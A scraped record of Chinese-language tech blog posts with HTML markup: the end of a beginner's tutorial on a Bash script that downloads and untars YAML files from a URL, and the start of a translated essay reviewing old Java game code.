-o-tab-size:4; -webkit-tab-size:4; tab-size:4;\"><div class=\"crayon-line\" id=\"crayon-594bce6aed82d689884426-1\"><span class=\"crayon-p\">#!/bin/sh</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-594bce6aed82d689884426-2\"><span class=\"crayon-e\">curl </span><span class=\"crayon-v\">http</span><span class=\"crayon-o\">:</span><span class=\"crayon-c\">//rather.long.url | tar -xz -C my_directory --strip-components=1</span></div></div></td>\r\n\t\t\t\t\t</tr>\r\n\t\t\t\t</table>\r\n\t\t\t</div>\r\n\t\t</div>\r\n<!-- [Format Time: 0.0004 seconds] -->\r\n<p>我迫不及待地运行看看。但我发现一个问题： URL 是会变的，根据我要访问的文件的分组不同而不同。我有新的问题需要解决，这使我进行了下一轮搜索。</p>\n<p><strong>参数如何传递给 Bash 脚本？</strong></p>\n<p>我需要以不同的 URL 和不同的最终目录来运行此脚本。 Google 向我展示了如何使用 <code>$1</code>、<code>$2</code> 等等来替换我在命令行中运行脚本时输入的内容。比如：</p><!-- Crayon Syntax Highlighter v2.7.1.1 -->\r\n\r\n\t\t<div id=\"crayon-594bce6aed838521541507\" class=\"crayon-syntax crayon-theme-github crayon-font-monaco crayon-os-pc print-yes notranslate\" data-settings=\" minimize scroll-always\" style=\" margin-top: 12px; margin-bottom: 12px; font-size: 13px !important; line-height: 15px !important;\">\r\n\t\t\r\n\t\t\t<div class=\"crayon-toolbar\" data-settings=\" show\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><span class=\"crayon-title\"></span>\r\n\t\t\t<div class=\"crayon-tools\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><div class=\"crayon-button crayon-nums-button\" title=\"切换是否显示行编号\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-plain-button\" title=\"纯文本显示代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-wrap-button\" title=\"切换自动换行\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-expand-button\" title=\"点击展开代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-copy-button\" title=\"复制代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-popup-button\" title=\"在新窗口中显示代码\"><div class=\"crayon-button-icon\"></div></div></div></div>\r\n\t\t\t<div class=\"crayon-info\" style=\"min-height: 18.2px !important; line-height: 18.2px !important;\"></div>\r\n\t\t\t<div class=\"crayon-plain-wrap\"><textarea wrap=\"soft\" class=\"crayon-plain print-no\" data-settings=\"dblclick\" readonly style=\"-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 13px !important; line-height: 15px !important;\">\nbash myscript.sh http://rather.long.url my_directory</textarea></div>\r\n\t\t\t<div class=\"crayon-main\" style=\"\">\r\n\t\t\t\t<table class=\"crayon-table\">\r\n\t\t\t\t\t<tr class=\"crayon-row\">\r\n\t\t\t\t<td class=\"crayon-nums \" data-settings=\"show\">\r\n\t\t\t\t\t<div class=\"crayon-nums-content\" style=\"font-size: 13px !important; line-height: 15px !important;\"><div class=\"crayon-num\" data-line=\"crayon-594bce6aed838521541507-1\">1</div></div>\r\n\t\t\t\t</td>\r\n\t\t\t\t\t\t<td class=\"crayon-code\"><div class=\"crayon-pre\" style=\"font-size: 13px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;\"><div class=\"crayon-line\" id=\"crayon-594bce6aed838521541507-1\"><span class=\"crayon-e\">bash </span><span class=\"crayon-v\">myscript</span><span class=\"crayon-sy\">.</span><span class=\"crayon-e\">sh </span><span class=\"crayon-v\">http</span><span class=\"crayon-o\">:</span><span class=\"crayon-c\">//rather.long.url my_directory</span></div></div></td>\r\n\t\t\t\t\t</tr>\r\n\t\t\t\t</table>\r\n\t\t\t</div>\r\n\t\t</div>\r\n<!-- [Format Time: 0.0005 seconds] -->\r\n<p>这就好多了。一切如我所愿，灵活，实用。最重要的是我只要输入一条简短的命令就可以节省 30 分钟无聊的复制、粘贴工作。这个早上的时间花得值得。</p>\n<p>然后我发现还有一个问题：我很健忘，并且我知道我几个月才运行一次这个脚本。这留给我两个疑问：</p>\n<ul>\n<li>我要如何记得运行脚本时输入什么（URL 先，还是目录先）？</li>\n<li>如果我被货车撞了，其它作家如何知道该怎样运行我的脚本？</li>\n</ul>\n<p>我需要一个使用说明 —— 如果我使用不正确，则脚本会提示。比如：</p><!-- Crayon Syntax Highlighter v2.7.1.1 -->\r\n\r\n\t\t<div id=\"crayon-594bce6aed83d066282074\" class=\"crayon-syntax crayon-theme-github crayon-font-monaco crayon-os-pc print-yes notranslate\" data-settings=\" minimize scroll-always\" style=\" margin-top: 12px; margin-bottom: 12px; font-size: 13px !important; line-height: 15px !important;\">\r\n\t\t\r\n\t\t\t<div class=\"crayon-toolbar\" data-settings=\" show\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><span class=\"crayon-title\"></span>\r\n\t\t\t<div class=\"crayon-tools\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><div class=\"crayon-button crayon-nums-button\" title=\"切换是否显示行编号\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-plain-button\" title=\"纯文本显示代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-wrap-button\" title=\"切换自动换行\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-expand-button\" title=\"点击展开代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-copy-button\" title=\"复制代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-popup-button\" title=\"在新窗口中显示代码\"><div class=\"crayon-button-icon\"></div></div></div></div>\r\n\t\t\t<div class=\"crayon-info\" style=\"min-height: 18.2px !important; line-height: 18.2px !important;\"></div>\r\n\t\t\t<div class=\"crayon-plain-wrap\"><textarea wrap=\"soft\" class=\"crayon-plain print-no\" data-settings=\"dblclick\" readonly style=\"-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 13px !important; line-height: 15px !important;\">\nusage: bash yaml-fetch.sh &lt;'snapshot_url'&gt; &lt;directory&gt;</textarea></div>\r\n\t\t\t<div class=\"crayon-main\" style=\"\">\r\n\t\t\t\t<table class=\"crayon-table\">\r\n\t\t\t\t\t<tr class=\"crayon-row\">\r\n\t\t\t\t<td class=\"crayon-nums \" data-settings=\"show\">\r\n\t\t\t\t\t<div class=\"crayon-nums-content\" style=\"font-size: 13px !important; line-height: 15px !important;\"><div class=\"crayon-num\" data-line=\"crayon-594bce6aed83d066282074-1\">1</div></div>\r\n\t\t\t\t</td>\r\n\t\t\t\t\t\t<td class=\"crayon-code\"><div class=\"crayon-pre\" style=\"font-size: 13px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;\"><div class=\"crayon-line\" id=\"crayon-594bce6aed83d066282074-1\"><span class=\"crayon-v\">usage</span><span class=\"crayon-o\">:</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">bash </span><span class=\"crayon-v\">yaml</span><span class=\"crayon-o\">-</span><span class=\"crayon-v\">fetch</span><span class=\"crayon-sy\">.</span><span class=\"crayon-v\">sh</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">&lt;</span><span class=\"crayon-s\">'snapshot_url'</span><span class=\"crayon-o\">&gt;</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">&lt;</span><span class=\"crayon-v\">directory</span><span class=\"crayon-o\">&gt;</span></div></div></td>\r\n\t\t\t\t\t</tr>\r\n\t\t\t\t</table>\r\n\t\t\t</div>\r\n\t\t</div>\r\n<!-- [Format Time: 0.0006 seconds] -->\r\n<p>否则，则直接运行脚本。我的下一个搜索是：</p>\n<p><strong>如何在 Bash 脚本里使用 “if/then/else”?</strong></p>\n<p>幸运的是，我已经知道编程中 <code>if/then/else</code> 的存在。我只要找出如何使用它的方法。在这个过程中，我也学到了如何在 Bash 脚本里使用 <code>echo</code> 打印。我的最终成果如下：</p><!-- Crayon Syntax Highlighter v2.7.1.1 -->\r\n\r\n\t\t<div id=\"crayon-594bce6aed841327721810\" class=\"crayon-syntax crayon-theme-github crayon-font-monaco crayon-os-pc print-yes notranslate\" data-settings=\" minimize scroll-always\" style=\" margin-top: 12px; margin-bottom: 12px; font-size: 13px !important; line-height: 15px !important;\">\r\n\t\t\r\n\t\t\t<div class=\"crayon-toolbar\" data-settings=\" show\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><span class=\"crayon-title\"></span>\r\n\t\t\t<div class=\"crayon-tools\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><div class=\"crayon-button crayon-nums-button\" title=\"切换是否显示行编号\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-plain-button\" title=\"纯文本显示代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-wrap-button\" title=\"切换自动换行\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-expand-button\" title=\"点击展开代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-copy-button\" title=\"复制代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-popup-button\" title=\"在新窗口中显示代码\"><div class=\"crayon-button-icon\"></div></div></div></div>\r\n\t\t\t<div class=\"crayon-info\" style=\"min-height: 18.2px !important; line-height: 18.2px !important;\"></div>\r\n\t\t\t<div class=\"crayon-plain-wrap\"><textarea wrap=\"soft\" class=\"crayon-plain print-no\" data-settings=\"dblclick\" readonly style=\"-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 13px !important; line-height: 15px !important;\">\n#!/bin/sh\r\nURL=$1\r\nDIRECTORY=$2\r\nif [ $# -eq 0 ];\r\n then\r\n echo \"usage: bash yaml-fetch.sh &lt;'snapshot_url'&gt; &lt;directory&gt;\".\r\n else\r\n# 如果目录不存在则创建它\r\n echo 'create directory'\r\n mkdir $DIRECTORY\r\n # 下载并解压 yaml 文件\r\n echo 'fetch and untar the yaml files'\r\n curl $URL | tar -xz -C $DIRECTORY --strip-components=1\r\nfi</textarea></div>\r\n\t\t\t<div class=\"crayon-main\" style=\"\">\r\n\t\t\t\t<table class=\"crayon-table\">\r\n\t\t\t\t\t<tr class=\"crayon-row\">\r\n\t\t\t\t<td class=\"crayon-nums \" data-settings=\"show\">\r\n\t\t\t\t\t<div class=\"crayon-nums-content\" style=\"font-size: 13px !important; line-height: 15px !important;\"><div class=\"crayon-num\" data-line=\"crayon-594bce6aed841327721810-1\">1</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-594bce6aed841327721810-2\">2</div><div class=\"crayon-num\" data-line=\"crayon-594bce6aed841327721810-3\">3</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-594bce6aed841327721810-4\">4</div><div class=\"crayon-num\" data-line=\"crayon-594bce6aed841327721810-5\">5</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-594bce6aed841327721810-6\">6</div><div class=\"crayon-num\" data-line=\"crayon-594bce6aed841327721810-7\">7</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-594bce6aed841327721810-8\">8</div><div class=\"crayon-num\" data-line=\"crayon-594bce6aed841327721810-9\">9</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-594bce6aed841327721810-10\">10</div><div class=\"crayon-num\" data-line=\"crayon-594bce6aed841327721810-11\">11</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-594bce6aed841327721810-12\">12</div><div class=\"crayon-num\" data-line=\"crayon-594bce6aed841327721810-13\">13</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-594bce6aed841327721810-14\">14</div></div>\r\n\t\t\t\t</td>\r\n\t\t\t\t\t\t<td class=\"crayon-code\"><div class=\"crayon-pre\" style=\"font-size: 13px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;\"><div class=\"crayon-line\" id=\"crayon-594bce6aed841327721810-1\"><span class=\"crayon-p\">#!/bin/sh</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-594bce6aed841327721810-2\"><span class=\"crayon-v\">URL</span><span class=\"crayon-o\">=</span><span class=\"crayon-sy\">$</span><span class=\"crayon-cn\">1</span></div><div class=\"crayon-line\" id=\"crayon-594bce6aed841327721810-3\"><span class=\"crayon-v\">DIRECTORY</span><span class=\"crayon-o\">=</span><span class=\"crayon-sy\">$</span><span class=\"crayon-cn\">2</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-594bce6aed841327721810-4\"><span class=\"crayon-st\">if</span><span class=\"crayon-h\"> </span><span class=\"crayon-sy\">[</span><span class=\"crayon-h\"> </span><span class=\"crayon-sy\">$</span><span class=\"crayon-p\"># -eq 0 ];</span></div><div class=\"crayon-line\" id=\"crayon-594bce6aed841327721810-5\"><span class=\"crayon-h\"> </span><span class=\"crayon-st\">then</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-594bce6aed841327721810-6\"><span class=\"crayon-h\"> </span><span class=\"crayon-i\">echo</span><span class=\"crayon-h\"> </span><span class=\"crayon-s\">\"usage: bash yaml-fetch.sh &lt;'snapshot_url'&gt; &lt;directory&gt;\"</span><span class=\"crayon-sy\">.</span></div><div class=\"crayon-line\" id=\"crayon-594bce6aed841327721810-7\"><span class=\"crayon-h\"> </span><span class=\"crayon-st\">else</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-594bce6aed841327721810-8\"><span class=\"crayon-p\"># 如果目录不存在则创建它</span></div><div class=\"crayon-line\" id=\"crayon-594bce6aed841327721810-9\"><span class=\"crayon-h\"> </span><span class=\"crayon-i\">echo</span><span class=\"crayon-h\"> </span><span class=\"crayon-s\">'create directory'</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-594bce6aed841327721810-10\"><span class=\"crayon-h\"> </span><span class=\"crayon-i\">mkdir</span><span class=\"crayon-h\"> </span><span class=\"crayon-sy\">$</span><span class=\"crayon-v\">DIRECTORY</span></div><div class=\"crayon-line\" id=\"crayon-594bce6aed841327721810-11\"><span class=\"crayon-h\"> </span><span class=\"crayon-p\"># 下载并解压 yaml 文件</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-594bce6aed841327721810-12\"><span class=\"crayon-h\"> </span><span class=\"crayon-i\">echo</span><span class=\"crayon-h\"> </span><span class=\"crayon-s\">'fetch and untar the yaml files'</span></div><div class=\"crayon-line\" id=\"crayon-594bce6aed841327721810-13\"><span class=\"crayon-h\"> </span><span class=\"crayon-i\">curl</span><span class=\"crayon-h\"> </span><span class=\"crayon-sy\">$</span><span class=\"crayon-v\">URL</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">|</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">tar</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">-</span><span class=\"crayon-v\">xz</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">-</span><span class=\"crayon-i\">C</span><span class=\"crayon-h\"> </span><span class=\"crayon-sy\">$</span><span class=\"crayon-v\">DIRECTORY</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">--</span><span class=\"crayon-v\">strip</span><span class=\"crayon-o\">-</span><span class=\"crayon-v\">components</span><span class=\"crayon-o\">=</span><span class=\"crayon-cn\">1</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-594bce6aed841327721810-14\"><span class=\"crayon-v\">fi</span></div></div></td>\r\n\t\t\t\t\t</tr>\r\n\t\t\t\t</table>\r\n\t\t\t</div>\r\n\t\t</div>\r\n<!-- [Format Time: 0.0021 seconds] -->\r\n<p></p>\n<h3 id=\"toc_3\">Google 和脚本编程如何颠覆我的世界？</h3>\n<p>好吧，这稍微有点夸大，不过现在是 21 世纪，学习新东西（特别是稍微简单的东西）比以前简单多了。我所学到的（除了如何写一个简短的、自动分类的 Bash 脚本之外）是如果我有疑问，那么有很大可能性是其它人在之前也有过相同的疑问。当我困惑时，我可以问下一个问题，再下一个问题。最后，我不仅拥有了脚本，还拥有了可以一直拥有并可以简化其它任务的新技能，这是我之前所没有的。</p>\n<p>别止步于第一个脚本（或者编程的第一步）。这是一个技能，和其它的技能并无不同，有大量的信息可以在这一路上帮助你。你无需阅读大量的书或参加一个月的课程。你可以像婴儿学步那样简单地开始写脚本，然后掌握技能并建立自信。人们总有写成千上万行代码的需求，并对它进行分支、合并、修复错误。但是，通过简单的脚本或其它方式来自动化、简单化任务的需求也一样强烈。这样的一个小脚本和小小的自信就能够让你启程脚本编程之路。</p>\n\r\n        \r\n        \r\n        \n    <div class=\"post-adds\">\n        <span data-post-id=\"111509\" class=\" btn-bluet-bigger href-style vote-post-up   register-user-only \"><i class=\"fa  fa-thumbs-o-up\"></i> <h10 id=\"111509votetotal\">2</h10> 赞</span>\n        <span data-book-type=\"1\" data-site-id=\"2\" data-item-id=\"111509\" data-item-type=\"1\" class=\" btn-bluet-bigger href-style bookmark-btn  register-user-only \"><i class=\"fa fa-bookmark-o  \"></i> 1 收藏</span>\n\n                    <a href=\"#article-comment\"><span class=\"btn-bluet-bigger href-style hide-on-480\"><i class=\"fa fa-comments-o\"></i> 1 评论</span></a>\n        \n        \n        \n        <!-- JiaThis Button BEGIN -->\n        <div class=\"jiathis_style_24x24\" style=\"display: inline-flex; position: relative; margin: 0; clear: both;float: right;\">\n            <a class=\"jiathis_button_tsina\"></a>\n            <a class=\"jiathis_button_weixin\"></a>\n            <a class=\"jiathis_button_qzone\"></a>\n            <a class=\"jiathis_button_fb hide-on-480\"></a>\n            <a href=\"http://www.jiathis.com/share?uid=1745061\" class=\"jiathis jiathis_txt jiathis_separator jtico jtico_jiathis\" target=\"_blank\"></a>\n        </div>\n\n    </div>\n\n\n\n\r\n        <!-- BEGIN #author-bio -->\r\n\r\n\r\n<!-- END #author-bio -->\r\n\t</div>", "front_image_url": ["http://jbcdn2.b0.upaiyun.com/2017/05/77d80105fd15f2465894827e23cc4842.jpeg"], "fav_nums": 1, "comment_nums": 1, "create_date": "2017/06/19", "praise_nums": 2}
{"tags": "游戏,开发", "front_image_path": "full/f441ef248c27fcc782a5b6bd4465cd4e2a55f0e3.jpg", "title": "13 年来，我写了这些糟糕的游戏代码", "url_object_id": "9458261ad38b61c6bee87f7c4df3bdc9", "url": "http://blog.jobbole.com/111373/", "content": "<div class=\"entry\">\r\n\r\n        \t\t\t<div class=\"textwidget\"></div>\n\t\t\r\n\t\t<div class=\"copyright-area\">本文由 <a href=\"http://blog.jobbole.com\">伯乐在线</a> - <a href=\"http://www.jobbole.com/members/q4000052677\">听风</a> 翻译，<a href=\"http://www.jobbole.com/members/hanxiaomax\">艾凌风</a> 校稿。未经许可，禁止转载！<br>英文出处：<a target=\"_blank\" href=\"http://etodd.io/2017/03/29/thirteen-years-of-bad-game-code/\">Evan Todd</a>。欢迎加入<a target=\"_blank\" href=\"http://group.jobbole.com/category/feedback/trans-team/\">翻译组</a>。</div><p>【导读】：Evan Todd 用风趣幽默的口吻点评了自己从 2004 年以来做游戏时写的代码，有 Java、C++、Python。经过十几年打怪练级，最近终于完整地做完并推出了自己的第一套游戏。Todd 今年 26 岁。</p>\n<hr>\n<p>在一个独处的星期五晚上，因急需一些灵感，你决定重温一些你过去「征服」的程序。旧硬盘缓缓地旋转着，你浏览着过去那些光荣岁月里编写的代码。</p>\n<p>噢，不！ 这根本不是你所期望的。代码真的有这么糟糕吗？ 为什么没有人告诉你？当时为什么会喜欢这样写？<strong>有必要</strong>在一个功能中写这么多的 goto 吗？很快，你就关闭了这个项目。 有那么一瞬间，你甚至考虑删除它，然后清空硬盘。</p>\n<p>以下是我对自己过去的编程经历中的一些经验教训、代码片段和警告的整理。为了暴露错误，我没有对原有的命名进行修改。</p>\n<h2>2004 年</h2>\n<p><iframe width=\"600\" height=\"450\" src=\"http://v.qq.com/iframe/player.html?vid=m0511tenz18\" frameborder=\"0\" allowfullscreen=\"allowfullscreen\"></iframe></p>\n<p>这一年我十三岁。这个项目取名《红月》，这是一个雄心勃勃的第三人称飞行射击游戏。在该项目中，几乎没有代码不是逐字逐句地从《Developing Games in Java》中复制出来的，这样写出来的代码毫无疑问糟糕透了。让我们来看一个例子。</p>\n<p>我想给玩家设计多武器切换功能。具体方案是将武器模型旋转到玩家模型的内部，用它变换出下一个武器，然后再将它旋转回来。以下是动画代码。 别把它想得太难了。</p><!-- Crayon Syntax Highlighter v2.7.1.1 -->\r\n\r\n\t\t<div id=\"crayon-594bab39c14de132195812\" class=\"crayon-syntax crayon-theme-github crayon-font-monaco crayon-os-pc print-yes notranslate\" data-settings=\" minimize scroll-always\" style=\" margin-top: 12px; margin-bottom: 12px; font-size: 13px !important; line-height: 15px !important;\">\r\n\t\t\r\n\t\t\t<div class=\"crayon-toolbar\" data-settings=\" show\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><span class=\"crayon-title\"></span>\r\n\t\t\t<div class=\"crayon-tools\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><div class=\"crayon-button crayon-nums-button\" title=\"切换是否显示行编号\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-plain-button\" title=\"纯文本显示代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-wrap-button\" title=\"切换自动换行\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-expand-button\" title=\"点击展开代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-copy-button\" title=\"复制代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-popup-button\" title=\"在新窗口中显示代码\"><div class=\"crayon-button-icon\"></div></div></div></div>\r\n\t\t\t<div class=\"crayon-info\" style=\"min-height: 18.2px !important; line-height: 18.2px !important;\"></div>\r\n\t\t\t<div class=\"crayon-plain-wrap\"><textarea wrap=\"soft\" class=\"crayon-plain print-no\" data-settings=\"dblclick\" readonly style=\"-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 13px !important; line-height: 15px !important;\">\npublic void updateAnimation(long eTime) {\r\n    if(group.getGroup(\"gun\") == null) {\r\n        group.addGroup((PolygonGroup)gun.clone());\r\n    }\r\n    changeTime -= eTime;\r\n    if(changing &amp;&amp; changeTime &lt;= 0) {\r\n        group.removeGroup(\"gun\");\r\n        group.addGroup((PolygonGroup)gun.clone());\r\n        weaponGroup = group.getGroup(\"gun\");\r\n        weaponGroup.xform.velocityAngleX.set(.003f, 250);\r\n        changing = false;\r\n    }\r\n}</textarea></div>\r\n\t\t\t<div class=\"crayon-main\" style=\"\">\r\n\t\t\t\t<table class=\"crayon-table\">\r\n\t\t\t\t\t<tr class=\"crayon-row\">\r\n\t\t\t\t<td class=\"crayon-nums \" data-settings=\"show\">\r\n\t\t\t\t\t<div class=\"crayon-nums-content\" style=\"font-size: 13px !important; line-height: 15px !important;\"><div class=\"crayon-num\" data-line=\"crayon-594bab39c14de132195812-1\">1</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-594bab39c14de132195812-2\">2</div><div class=\"crayon-num\" data-line=\"crayon-594bab39c14de132195812-3\">3</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-594bab39c14de132195812-4\">4</div><div class=\"crayon-num\" data-line=\"crayon-594bab39c14de132195812-5\">5</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-594bab39c14de132195812-6\">6</div><div class=\"crayon-num\" data-line=\"crayon-594bab39c14de132195812-7\">7</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-594bab39c14de132195812-8\">8</div><div class=\"crayon-num\" data-line=\"crayon-594bab39c14de132195812-9\">9</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-594bab39c14de132195812-10\">10</div><div class=\"crayon-num\" data-line=\"crayon-594bab39c14de132195812-11\">11</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-594bab39c14de132195812-12\">12</div><div class=\"crayon-num\" data-line=\"crayon-594bab39c14de132195812-13\">13</div></div>\r\n\t\t\t\t</td>\r\n\t\t\t\t\t\t<td class=\"crayon-code\"><div class=\"crayon-pre\" style=\"font-size: 13px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;\"><div class=\"crayon-line\" id=\"crayon-594bab39c14de132195812-1\"><span class=\"crayon-m\">public</span><span class=\"crayon-h\"> </span><span class=\"crayon-t\">void</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">updateAnimation</span><span class=\"crayon-sy\">(</span><span class=\"crayon-t\">long</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">eTime</span><span class=\"crayon-sy\">)</span><span class=\"crayon-h\"> </span><span class=\"crayon-sy\">{</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-594bab39c14de132195812-2\"><span class=\"crayon-h\">    </span><span class=\"crayon-st\">if</span><span class=\"crayon-sy\">(</span><span class=\"crayon-v\">group</span><span class=\"crayon-sy\">.</span><span class=\"crayon-e\">getGroup</span><span class=\"crayon-sy\">(</span><span class=\"crayon-s\">\"gun\"</span><span class=\"crayon-sy\">)</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">==</span><span class=\"crayon-h\"> </span><span class=\"crayon-t\">null</span><span class=\"crayon-sy\">)</span><span class=\"crayon-h\"> </span><span class=\"crayon-sy\">{</span></div><div class=\"crayon-line\" id=\"crayon-594bab39c14de132195812-3\"><span class=\"crayon-h\">        </span><span class=\"crayon-v\">group</span><span class=\"crayon-sy\">.</span><span class=\"crayon-e\">addGroup</span><span class=\"crayon-sy\">(</span><span class=\"crayon-sy\">(</span><span class=\"crayon-v\">PolygonGroup</span><span class=\"crayon-sy\">)</span><span class=\"crayon-v\">gun</span><span class=\"crayon-sy\">.</span><span class=\"crayon-e\">clone</span><span class=\"crayon-sy\">(</span><span class=\"crayon-sy\">)</span><span class=\"crayon-sy\">)</span><span class=\"crayon-sy\">;</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-594bab39c14de132195812-4\"><span class=\"crayon-h\">    </span><span class=\"crayon-sy\">}</span></div><div class=\"crayon-line\" id=\"crayon-594bab39c14de132195812-5\"><span class=\"crayon-h\">    </span><span class=\"crayon-v\">changeTime</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">-=</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">eTime</span><span class=\"crayon-sy\">;</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-594bab39c14de132195812-6\"><span class=\"crayon-h\">    </span><span class=\"crayon-st\">if</span><span class=\"crayon-sy\">(</span><span class=\"crayon-v\">changing</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">&amp;&amp;</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">changeTime</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">&lt;=</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">0</span><span class=\"crayon-sy\">)</span><span class=\"crayon-h\"> </span><span class=\"crayon-sy\">{</span></div><div class=\"crayon-line\" id=\"crayon-594bab39c14de132195812-7\"><span class=\"crayon-h\">        </span><span class=\"crayon-v\">group</span><span class=\"crayon-sy\">.</span><span class=\"crayon-e\">removeGroup</span><span class=\"crayon-sy\">(</span><span class=\"crayon-s\">\"gun\"</span><span class=\"crayon-sy\">)</span><span class=\"crayon-sy\">;</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-594bab39c14de132195812-8\"><span class=\"crayon-h\">        </span><span class=\"crayon-v\">group</span><span class=\"crayon-sy\">.</span><span class=\"crayon-e\">addGroup</span><span class=\"crayon-sy\">(</span><span class=\"crayon-sy\">(</span><span class=\"crayon-v\">PolygonGroup</span><span class=\"crayon-sy\">)</span><span class=\"crayon-v\">gun</span><span class=\"crayon-sy\">.</span><span class=\"crayon-e\">clone</span><span class=\"crayon-sy\">(</span><span class=\"crayon-sy\">)</span><span class=\"crayon-sy\">)</span><span class=\"crayon-sy\">;</span></div><div class=\"crayon-line\" id=\"crayon-594bab39c14de132195812-9\"><span class=\"crayon-h\">        </span><span class=\"crayon-v\">weaponGroup</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">=</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">group</span><span class=\"crayon-sy\">.</span><span class=\"crayon-e\">getGroup</span><span class=\"crayon-sy\">(</span><span class=\"crayon-s\">\"gun\"</span><span class=\"crayon-sy\">)</span><span class=\"crayon-sy\">;</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-594bab39c14de132195812-10\"><span class=\"crayon-h\">        </span><span class=\"crayon-v\">weaponGroup</span><span class=\"crayon-sy\">.</span><span class=\"crayon-v\">xform</span><span class=\"crayon-sy\">.</span><span class=\"crayon-v\">velocityAngleX</span><span class=\"crayon-sy\">.</span><span class=\"crayon-e\">set</span><span class=\"crayon-sy\">(</span><span class=\"crayon-sy\">.</span><span class=\"crayon-cn\">003f</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">250</span><span class=\"crayon-sy\">)</span><span class=\"crayon-sy\">;</span></div><div class=\"crayon-line\" id=\"crayon-594bab39c14de132195812-11\"><span class=\"crayon-h\">        </span><span class=\"crayon-v\">changing</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">=</span><span class=\"crayon-h\"> </span><span class=\"crayon-t\">false</span><span class=\"crayon-sy\">;</span></div><div class=\"crayon-line crayon-striped-line\" 